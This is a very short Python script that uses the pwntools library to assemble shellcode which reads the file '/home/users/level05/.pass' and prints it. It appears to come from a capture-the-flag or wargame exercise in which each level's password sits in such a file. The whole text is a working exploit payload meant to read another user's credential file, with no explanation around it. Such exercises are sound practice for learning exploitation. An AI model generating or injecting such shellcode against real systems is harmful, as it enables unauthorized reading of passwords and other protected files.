from pwn import *
shellcode = asm(shellcraft.cat("/home/users/level05/.pass"))

print(shellcode)
